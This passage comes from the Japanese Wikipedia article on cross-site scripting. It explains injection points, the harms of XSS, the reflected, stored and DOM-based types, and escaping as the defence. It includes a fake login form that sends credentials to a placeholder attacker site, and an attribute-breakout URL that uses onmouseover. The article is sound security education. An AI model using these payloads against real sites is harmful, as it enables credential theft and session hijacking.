+<h3><span id=".E3.82.A4.E3.83.B3.E3.82.B8.E3.82.A7.E3.82.AF.E3.82.B7.E3.83.A7.E3.83.B3.E7.AE.87.E6.89.80"></span><span class="mw-headline" id="インジェクション箇所">インジェクション箇所</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=10" title="節を編集: インジェクション箇所">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p>HTML内には攻撃者が悪意のあるスクリプトをインジェクションし得る箇所として以下のものがある：
+</p>
+<ol><li>フォームなど変数の値を入力可能な場所（前述）</li>
+<li>スクリプト文
+<ul><li>&lt;script&gt;&lt;/script&gt;の内部<sup class="reference" id="cite_ref-FOOTNOTEIPA2014_6-1"><a href="#cite_note-FOOTNOTEIPA2014-6">[6]</a></sup>、および&lt;script&gt;&lt;/script&gt;のURLのリモート参照<sup class="reference" id="cite_ref-FOOTNOTEIPA2014_6-2"><a href="#cite_note-FOOTNOTEIPA2014-6">[6]</a></sup></li>
+<li>タグのstyle属性およびイベントハンドラ属性中のスクリプト記述<sup class="reference" id="cite_ref-FOOTNOTEIPA2014_6-3"><a href="#cite_note-FOOTNOTEIPA2014-6">[6]</a></sup>。具体的には&lt;div style="...;z:expression(...);..."&gt;や、&lt;span onmouseover="..."&gt;等<sup class="reference" id="cite_ref-FOOTNOTEIPA2014_6-4"><a href="#cite_note-FOOTNOTEIPA2014-6">[6]</a></sup>。</li></ul></li>
+<li>URLを属性値として取れる要素<sup class="reference" id="cite_ref-FOOTNOTE徳丸2011106_10-0"><a href="#cite_note-FOOTNOTE徳丸2011106-10">[10]</a></sup>、およびそこでのスクリプト直接記述<sup class="reference" id="cite_ref-FOOTNOTEIPA2014_6-5"><a href="#cite_note-FOOTNOTEIPA2014-6">[6]</a></sup>。
+<ul><li>具体的にはa要素のhrefとimg<sup class="reference" id="cite_ref-FOOTNOTE徳丸2011106_10-1"><a href="#cite_note-FOOTNOTE徳丸2011106-10">[10]</a></sup>、frameとiframeのsrc属性<sup class="reference" id="cite_ref-FOOTNOTE徳丸2011106_10-2"><a href="#cite_note-FOOTNOTE徳丸2011106-10">[10]</a></sup>。</li></ul></li></ol>
+<p>2.の場合、URLとして「javascript:(JavaScript文)」の形式(javascriptスキーム)を利用してJavascriptを注入することができる<sup class="reference" id="cite_ref-FOOTNOTE徳丸2011106_10-3"><a href="#cite_note-FOOTNOTE徳丸2011106-10">[10]</a></sup>。
+</p>
+<h2><span id="XSS.E3.81.AE.E8.A2.AB.E5.AE.B3"></span><span class="mw-headline" id="XSSの被害">XSSの被害</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=11" title="節を編集: XSSの被害">編集</a><span class="mw-editsection-bracket">]</span></span></h2>
+
+<p>攻撃者はXSSを用いることで、例えば以下の様な被害を発生させられる：
+</p>
+<ul><li>標的サイトの変数値や<a href="/wiki/HTTP_cookie" title="HTTP cookie">cookie</a>などからの情報漏洩<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-14"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup><sup class="reference" id="cite_ref-FOOTNOTE金床20073章冒頭部_3-3"><a href="#cite_note-FOOTNOTE金床20073章冒頭部-3">[3]</a></sup></li>
+<li><a href="/wiki/%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%8F%E3%82%A4%E3%82%B8%E3%83%A3%E3%83%83%E3%82%AF" title="セッションハイジャック">セッションハイジャック</a><sup class="reference" id="cite_ref-FOOTNOTE金床20073章冒頭部_3-4"><a href="#cite_note-FOOTNOTE金床20073章冒頭部-3">[3]</a></sup></li>
+<li>機能の不正実行<sup class="reference" id="cite_ref-FOOTNOTE金床20073章冒頭部_3-5"><a href="#cite_note-FOOTNOTE金床20073章冒頭部-3">[3]</a></sup></li>
+<li>ウェブサイトの改竄（ただし攻撃者が準備したURLからアクセスした場合のみ）<sup class="reference" id="cite_ref-FOOTNOTE金床20073章冒頭部_3-6"><a href="#cite_note-FOOTNOTE金床20073章冒頭部-3">[3]</a></sup></li>
+<li>悪意のあるスクリプトによりWebページを改ざんする事でパスワードやクレジットカード番号を入力するフォームをWebページに追加し、ユーザからこれらの情報を盗む（<a href="/wiki/%E3%83%95%E3%82%A3%E3%83%83%E3%82%B7%E3%83%B3%E3%82%B0_(%E8%A9%90%E6%AC%BA)" title="フィッシング (詐欺)">フィッシング 詐欺</a>）<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-15"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup></li>
+<li>悪意のあるスクリプトを使ってブラウザの脆弱性を突き、ユーザ端末を乗っ取る<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-16"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup></li>
+<li>ワームの実行<sup class="reference" id="cite_ref-FOOTNOTE金床20073章冒頭部_3-7"><a href="#cite_note-FOOTNOTE金床20073章冒頭部-3">[3]</a></sup></li></ul>
+<h3><span id=".E5.80.8B.E4.BA.BA.E6.83.85.E5.A0.B1.E3.81.AE.E5.A5.AA.E5.8F.96"></span><span class="mw-headline" id="個人情報の奪取">個人情報の奪取</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=12" title="節を編集: 個人情報の奪取">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p>攻撃者は標的サイトexample.comで任意のスクリプトを実行可能なので例えばスクリプトに以下の様なhtmlの<a href="/wiki/%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0_(%E3%82%A6%E3%82%A7%E3%83%96)" title="フォーム (ウェブ)">フォーム</a>を生成させる事でユーザが入力したID/パスワードを攻撃者のサイトに転送させる事ができる：
+</p>
+<pre>ログインしてください：&lt;br /&gt;
+&lt;form name=login action="<span style="color:red">（攻撃者のサイト名）</span>" method="post"&gt;
+   ID &lt;input type="text" name="id"&gt; &lt;br /&gt;
+   パスワード &lt;input type="text" name="pass"&gt; &lt;br /&gt;
+&lt;/form&gt;
+</pre>
+<h2><span id=".E6.94.BB.E6.92.83.E6.89.8B.E6.B3.95.E3.81.AE.E5.88.86.E9.A1.9E"></span><span class="mw-headline" id="攻撃手法の分類">攻撃手法の分類</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=13" title="節を編集: 攻撃手法の分類">編集</a><span class="mw-editsection-bracket">]</span></span></h2>
+<p>CWE-79ではXSSの攻撃手法を以下の３種類に分類している<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-17"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>：
+</p>
+<ul><li>タイプ 1：反射型クロスサイトスクリプティング (非持続的)</li>
+<li>タイプ 2: 格納型クロスサイトスクリプティング (持続的)</li>
+<li>タイプ 0: DOMベースのクロスサイトスクリプティング</li></ul>
+<h3><span id=".E5.8F.8D.E5.B0.84.E5.9E.8BXSS"></span><span class="mw-headline" id="反射型XSS">反射型XSS</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=14" title="節を編集: 反射型XSS">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p><b>反射型XSS</b>では、攻撃者は不正なデータDをWebページPのURLなどに仕込んでおり、Dが原因でWebアプリケーションが作るPのhtml本文などに悪意のあるスクリプトが含まれる。被害者がWebページPのURLをクリックすると、Pの内容とともに悪意のあるスクリプトが被害者のブラウザに送信され、ブラウザ上で悪意のあるスクリプトが実行される事で被害が生じる。したがって攻撃者が反射型XSSの脆弱性を利用するには、被害者をPに誘導する方法を別途考える必要がある。
+</p><p>反射型XSSにおいて攻撃者が被害者をWebページPに誘導する方法は主に２つある<sup class="reference" id="cite_ref-FOOTNOTEIPA201522-29_11-0"><a href="#cite_note-FOOTNOTEIPA201522-29-11">[11]</a></sup>。第一の方法は、標的サイトとは別のWebサイト（<a href="/wiki/%E9%9B%BB%E5%AD%90%E6%8E%B2%E7%A4%BA%E6%9D%BF" title="電子掲示板">公開掲示板</a>や攻撃者自身のWebサイトなど）にPのURLを張り、被害者がPへのリンクをクリックするのを待つ方法である。第二の方法は標的サイトを装って被害者にメールし、そのメール本文にPのURLを記載することで、被害者がPを閲覧するのを期待する方法である。
+</p>
+<h3><span id=".E6.A0.BC.E7.B4.8D.E5.9E.8BXSS"></span><span class="mw-headline" id="格納型XSS">格納型XSS</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=15" title="節を編集: 格納型XSS">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p>一方、<b>格納型XSS</b>では、攻撃者は不正なデータDを標的サイトのデータベース、メッセージフォーラム、訪問者のログといったデータストアに保存する<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-18"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>。たとえば電子掲示板に格納型XSSの脆弱性がある場合、攻撃者は不正なデータDを含んだ書き込みを掲示板に対して行う。すると掲示板システムはDを自身のデータストアに保存し、正規の利用者が掲示板を訪れるたびにDを含んだ書き込みを表示するため、この書き込みを表示した利用者全員がXSSの被害者になりうる。格納型XSSは正規サイトのデータストアそのものに不正なデータを仕込むので、反射型XSSと違い被害者に不正なURLをクリックさせる必要がない事が攻撃者にとっての利点の一つである。
+</p>
+<h3><span id="DOM.E3.83.99.E3.83.BC.E3.82.B9XSS"></span><span class="mw-headline" id="DOMベースXSS">DOMベースXSS</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=16" title="節を編集: DOMベースXSS">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p>反射型および格納型のXSSではWebアプリケーション側が悪意のあるスクリプトを含んだWebページPを作り出す事が原因で、Pを閲覧した被害者が被害を受ける<sup class="reference" id="cite_ref-FOOTNOTEIPA20135-8_12-0"><a href="#cite_note-FOOTNOTEIPA20135-8-12">[12]</a></sup>。それに対し<b>DOMベースXSS</b>は、ブラウザなどのユーザ・クライアントが悪意のあるスクリプトを含んだWebページを生成するタイプのXSSの総称である。DOMベースXSSは、スクリプトを使った以下のような動的html生成(<a href="/wiki/Document_Object_Model" title="Document Object Model">DOM</a>操作<sup class="reference" id="cite_ref-FOOTNOTEIPA20135-8_12-1"><a href="#cite_note-FOOTNOTEIPA20135-8-12">[12]</a></sup>)を利用する。一般にユーザがWebサイトにアクセスすると、Webアプリケーションはユーザ・クライアントに対し、（悪意のない正規の）スクリプトSを含んだhtmlを送り返すことがある。ユーザ・クライアントはこのhtmlを受け取ると、htmlに含まれるスクリプトSを実行することで、htmlを書き換え、画面に出力する最終的なhtmlを得る。
+</p><p>DOMベースXSSではこの仕組みを悪用し、ユーザ・クライアント側で実行されるスクリプトSに不正なデータDを注入することで、XSS攻撃を実行する。Dを注入する箇所としては反射型XSSと同様、URLなどを利用する<sup class="reference" id="cite_ref-FOOTNOTEIPA201310_13-0"><a href="#cite_note-FOOTNOTEIPA201310-13">[13]</a></sup>。
+</p><p>他の２つのXSSとは異なり、<b>Webアプリケーション側ではDOMベースXSS攻撃が行われていることを感知できない</b><sup class="reference" id="cite_ref-14"><a href="#cite_note-14">[14]</a></sup>。したがって例えばWebアプリケーション側に<a href="/wiki/Web_Application_Firewall" title="Web Application Firewall">WAF</a>を導入するなどの対策を施してもこの攻撃を検知したり防いだりする事はできない。
+</p><p>というのもDOMの仕組みでは、スクリプトSに注入される不正なデータDは、Webアプリケーションではなくユーザ・クライアント側で取得し、ユーザ・クライアント側でDが注入されたスクリプトSを実行するので、Webアプリケーション側には不正なデータDが一切伝わらないからである。
+</p>
+<h2><span id=".E5.AF.BE.E7.AD.96"></span><span class="mw-headline" id="対策">対策</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=17" title="節を編集: 対策">編集</a><span class="mw-editsection-bracket">]</span></span></h2>
+
+<p>すでに述べたように、XSSへの対策としてはユーザからフォームの値を取得した際、htmlで特別な意味を持つ記号を以下のように別の記号に置き換える（<b>エスケープ処理</b>をする）という方法がある：
+</p>
+<ul><li>「&lt;」 → &amp;lt;</li>
+<li>「&gt;」 → &amp;gt;</li>
+<li>「"」 → &amp;quot;</li>
+<li>…</li></ul>
+<p>このようにすると攻撃者が攻撃用スクリプトを埋め込むのに利用したhtmlのタグ「&lt;script&gt;」は「&amp;lt;script&amp;gt;」という無害な文字列に置き換わってしまうので上述したXSS攻撃を回避できる。
+</p><p>なおエスケープ処理は例えば<a href="/wiki/PHP_(%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E8%A8%80%E8%AA%9E)" title="PHP (プログラミング言語)">PHP</a>のhtmlspecialchars関数を利用する事で実現可能である。
+</p><p>しかしこのような対策には限界があり、<a href="#インジェクション箇所">#インジェクション箇所</a>で述べた、スクリプトが直接記述可能な箇所やURLを記述可能な箇所に対しては、この対策は効かない<sup class="reference" id="cite_ref-FOOTNOTEIPA2014_6-6"><a href="#cite_note-FOOTNOTEIPA2014-6">[6]</a></sup>。
+</p><p>エスケープが必要な記号として、「&lt;」、「&gt;」、「"」などがある。。「&lt;」と「&gt;」をエスケープする必要がある理由の一つはすでに具体例で挙げたように「&lt;script&gt;」を無効にするためである。「"」をエスケープする理由は以下で述べる。
+</p>
+<h3><span id=".E5.BC.95.E7.94.A8.E7.AC.A6.E3.81.A7.E5.9B.B2.E3.82.93.E3.81.A0.E5.B1.9E.E6.80.A7.E5.80.A4.E3.81.AB.E5.AF.BE.E3.81.99.E3.82.8BXSS"></span><span class="mw-headline" id="引用符で囲んだ属性値に対するXSS">引用符で囲んだ属性値に対するXSS</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=18" title="節を編集: 引用符で囲んだ属性値に対するXSS">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p>HTML中で属性値を引用符でくくっていても適切な対策（属性値中で引用符「"」をエスケープ）をしない限り、XSS対策にならない。たとえば
+</p>
+<pre>&lt;input type="text" name="gender" <span style="color:blue">value="inputval"</span>&gt; &lt;br /&gt;
+</pre>
+<p>のように青色で示した入力値inputvalが引用符でくくられていたとしていても
+攻撃者が
+</p>
+<pre>http://example.com/?<span style="color:blue">name=</span><span style="color:red">"+onmouseover%3d"（悪意のあるスクリプト）</span>
+</pre>
+<p>というURLを被害者にクリックさせると、被害者のブラウザでは（HTML中では%3dが「=」に変換されるので）
+</p>
+<pre>&lt;input type="text" name="gender" <span style="color:blue">value="</span><span style="color:red">"onmouseover="（悪意のあるスクリプト）</span><span style="color:blue">"</span>&gt; &lt;br /&gt;
+</pre>
+<p>となってしまうので、onmouseoverイベントハンドラによりマウス移動時に悪意のあるスクリプトが実行されてしまう<sup class="reference" id="cite_ref-FOOTNOTE徳丸2011100-101_15-0"><a href="#cite_note-FOOTNOTE徳丸2011100-101-15">[15]</a></sup>。
+</p><p><br/>
+</p>
+<h2><span id=".E8.84.9A.E6.B3.A8"></span><span class="mw-headline" id="脚注">脚注</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=19" title="節を編集: 脚注">編集</a><span class="mw-editsection-bracket">]</span></span></h2>
+<div class="reflist" style="list-style-type: decimal;">
+<div class="mw-references-wrap mw-references-columns"><ol class="references">
+<li id="cite_note-FOOTNOTECWE-792011-1">^ <a href="#cite_ref-FOOTNOTECWE-792011_1-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-2"><sup><i><b>c</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-3"><sup><i><b>d</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-4"><sup><i><b>e</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-5"><sup><i><b>f</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-6"><sup><i><b>g</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-7"><sup><i><b>h</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-8"><sup><i><b>i</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-9"><sup><i><b>j</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-10"><sup><i><b>k</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-11"><sup><i><b>l</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-12"><sup><i><b>m</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-13"><sup><i><b>n</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-14"><sup><i><b>o</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-15"><sup><i><b>p</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-16"><sup><i><b>q</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-17"><sup><i><b>r</b></i></sup></a> <a href="#cite_ref-FOOTNOTECWE-792011_1-18"><sup><i><b>s</b></i></sup></a> <span class="reference-text"><a href="#CITEREFCWE-792011">CWE-79 2011</a>.</span>
+</li>
+<li id="cite_note-:0-2"><b><a href="#cite_ref-:0_2-0">^</a></b> <span class="reference-text"><a class="external text" href="https://www.ipa.go.jp/security/vuln/CWE.html" rel="nofollow">共通脆弱性タイプ一覧CWE概説</a>。IPA</span>
+</li>
+<li id="cite_note-FOOTNOTE金床20073章冒頭部-3">^ <a href="#cite_ref-FOOTNOTE金床20073章冒頭部_3-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-FOOTNOTE金床20073章冒頭部_3-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-FOOTNOTE金床20073章冒頭部_3-2"><sup><i><b>c</b></i></sup></a> <a href="#cite_ref-FOOTNOTE金床20073章冒頭部_3-3"><sup><i><b>d</b></i></sup></a> <a href="#cite_ref-FOOTNOTE金床20073章冒頭部_3-4"><sup><i><b>e</b></i></sup></a> <a href="#cite_ref-FOOTNOTE金床20073章冒頭部_3-5"><sup><i><b>f</b></i></sup></a> <a href="#cite_ref-FOOTNOTE金床20073章冒頭部_3-6"><sup><i><b>g</b></i></sup></a> <a href="#cite_ref-FOOTNOTE金床20073章冒頭部_3-7"><sup><i><b>h</b></i></sup></a> <span class="reference-text"><a href="#CITEREF金床2007">金床 2007</a>, p. 3章冒頭部.</span>
+</li>
+<li id="cite_note-4"><b><a href="#cite_ref-4">^</a></b> <span class="reference-text"><a class="external text" href="http://e-words.jp/w/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0.html" rel="nofollow">IT用語辞典e-words「クロスサイトスクリプティング」</a> 2016/09/12閲覧</span>
+</li>
+<li id="cite_note-FOOTNOTE金床20073章『攻撃の概要』節-5">^ <a href="#cite_ref-FOOTNOTE金床20073章『攻撃の概要』節_5-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-FOOTNOTE金床20073章『攻撃の概要』節_5-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-FOOTNOTE金床20073章『攻撃の概要』節_5-2"><sup><i><b>c</b></i></sup></a> <span class="reference-text"><a href="#CITEREF金床2007">金床 2007</a>, p. 3章『攻撃の概要』節.</span>
+</li>
+<li id="cite_note-FOOTNOTEIPA2014-6">^ <a href="#cite_ref-FOOTNOTEIPA2014_6-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA2014_6-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA2014_6-2"><sup><i><b>c</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA2014_6-3"><sup><i><b>d</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA2014_6-4"><sup><i><b>e</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA2014_6-5"><sup><i><b>f</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA2014_6-6"><sup><i><b>g</b></i></sup></a> <span class="reference-text"><a href="#CITEREFIPA2014">IPA 2014</a>.</span>
+</li>
+<li id="cite_note-FOOTNOTEIPA2011-7">^ <a href="#cite_ref-FOOTNOTEIPA2011_7-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA2011_7-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA2011_7-2"><sup><i><b>c</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA2011_7-3"><sup><i><b>d</b></i></sup></a> <span class="reference-text"><a href="#CITEREFIPA2011">IPA 2011</a>.</span>
+</li>
+<li id="cite_note-FOOTNOTE金床2007第三章「攻撃の概要」節-8"><b><a href="#cite_ref-FOOTNOTE金床2007第三章「攻撃の概要」節_8-0">^</a></b> <span class="reference-text"><a href="#CITEREF金床2007">金床 2007</a>, p. 第三章「攻撃の概要」節.</span>
+</li>
+<li id="cite_note-FOOTNOTE徳丸201191-9">^ <a href="#cite_ref-FOOTNOTE徳丸201191_9-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-FOOTNOTE徳丸201191_9-1"><sup><i><b>b</b></i></sup></a> <span class="reference-text"><a href="#CITEREF徳丸2011">徳丸 2011</a>, p. 91.</span>
+</li>
+<li id="cite_note-FOOTNOTE徳丸2011106-10">^ <a href="#cite_ref-FOOTNOTE徳丸2011106_10-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-FOOTNOTE徳丸2011106_10-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-FOOTNOTE徳丸2011106_10-2"><sup><i><b>c</b></i></sup></a> <a href="#cite_ref-FOOTNOTE徳丸2011106_10-3"><sup><i><b>d</b></i></sup></a> <span class="reference-text"><a href="#CITEREF徳丸2011">徳丸 2011</a>, p. 106.</span>
+</li>
+<li id="cite_note-FOOTNOTEIPA201522-29-11"><b><a href="#cite_ref-FOOTNOTEIPA201522-29_11-0">^</a></b> <span class="reference-text"><a href="#CITEREFIPA2015">IPA 2015</a>, p. 22-29.</span>
+</li>
+<li id="cite_note-FOOTNOTEIPA20135-8-12">^ <a href="#cite_ref-FOOTNOTEIPA20135-8_12-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-FOOTNOTEIPA20135-8_12-1"><sup><i><b>b</b></i></sup></a> <span class="reference-text"><a href="#CITEREFIPA2013">IPA 2013</a>, p. 5-8.</span>
+</li>
+<li id="cite_note-FOOTNOTEIPA201310-13"><b><a href="#cite_ref-FOOTNOTEIPA201310_13-0">^</a></b> <span class="reference-text"><a href="#CITEREFIPA2013">IPA 2013</a>, p. 10.</span>
+</li>
+<li id="cite_note-14"><b><a href="#cite_ref-14">^</a></b> <span class="reference-text"><cite class="citation web" style="font-style:normal">“<a class="external text" href="https://www.ipa.go.jp/files/000024729.pdf" rel="nofollow">あまり知られていない脆弱性：DOM Based XSSにご用心</a>”.   アークウェブ (2007年2月16日). <span title="">2016年9月12日</span>閲覧。</cite></span>
+</li>
+<li id="cite_note-FOOTNOTE徳丸2011100-101-15"><b><a href="#cite_ref-FOOTNOTE徳丸2011100-101_15-0">^</a></b> <span class="reference-text"><a href="#CITEREF徳丸2011">徳丸 2011</a>, p. 100-101.</span>
+</li>
+</ol></div></div>
+<h2><span id=".E5.8F.82.E8.80.83.E6.96.87.E7.8C.AE"></span><span class="mw-headline" id="参考文献">参考文献</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=20" title="節を編集: 参考文献">編集</a><span class="mw-editsection-bracket">]</span></span></h2>
+<ul><li><cite class="citation web" id="CITEREFCWE-792011" style="font-style:normal">“<a class="external text" href="http://jvndb.jvn.jp/ja/cwe/CWE-79.html" rel="nofollow">CWE-79 クロスサイトスクリプティング</a>”.   <a class="external text" href="http://jvn.jp/" rel="nofollow">JVN iPedia</a> (2011年4月21日). <span title="">2016年9月12日</span>閲覧。</cite></li>
+<li><a href="/wiki/%E6%83%85%E5%A0%B1%E5%87%A6%E7%90%86%E6%8E%A8%E9%80%B2%E6%A9%9F%E6%A7%8B" title="情報処理推進機構">情報処理推進機構</a> 技術本部 セキュリティーセンター(IPA ISEC)のサイト内：
+<ul><li><cite class="citation web" id="CITEREFIPA2014" style="font-style:normal">“<a class="external text" href="https://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/601.html" rel="nofollow">『セキュア・プログラミング講座』第7章 エコーバック対策 スクリプト注入</a>”.   独立行政法人 <a href="/wiki/%E6%83%85%E5%A0%B1%E5%87%A6%E7%90%86%E6%8E%A8%E9%80%B2%E6%A9%9F%E6%A7%8B" title="情報処理推進機構">情報処理推進機構</a> 技術本部 セキュリティーセンター (2014年8月19日). <span title="">2016年10月17日</span>閲覧。</cite></li>
+<li><cite class="citation web" id="CITEREFIPA2013" style="font-style:normal">編集責任：小林偉昭、執筆者：谷口隼祐、永安佑希允、協力者：徳丸浩 (2013年1月29日). “<a class="external text" href="https://www.ipa.go.jp/files/000024729.pdf" rel="nofollow">IPAテクニカルウォッチ「DOM Based XSS」に関するレポート～JavaScriptでHTMLを操作するアプリは要注意！～</a>”.   IPA. <span title="">2016年9月12日</span>閲覧。</cite></li>
+<li><cite class="citation web" id="CITEREFIPA2011" style="font-style:normal">“<span class="PDFlink"><a class="external text" href="https://www.ipa.go.jp/files/000017316.pdf" rel="nofollow">安全なウェブサイトの作り方 改訂第７版 ウェブアプリケーションのセキュリティ実装とウェブサイトの安全性向上のための取り組み</a></span> <span style="font-size:smaller">(<a href="/wiki/Portable_Document_Format" title="Portable Document Format">PDF</a>)</span>”.   独立行政法人 <a href="/wiki/%E6%83%85%E5%A0%B1%E5%87%A6%E7%90%86%E6%8E%A8%E9%80%B2%E6%A9%9F%E6%A7%8B" title="情報処理推進機構">情報処理推進機構</a> セキュリティーセンター (2015年3月). <span title="">2016年9月12日</span>閲覧。</cite></li></ul></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=OWASP&amp;action=edit&amp;redlink=1" title="OWASP (存在しないページ)">OWASP</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:OWASP&amp;action=edit&amp;redlink=1" title="En:OWASP (存在しないページ)">英語版</a>）</span></span>のサイト内：
+<ul><li><cite class="citation web" id="CITEREFOWASP-Cheat2016" style="font-style:normal">“<a class="external text" href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" rel="nofollow">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>”.   <a class="external text" href="https://www.owasp.org/index.php/Main_Page" rel="nofollow">OWASP</a> (2016年3月27日). <span title="">2016年10月17日</span>閲覧。</cite></li>
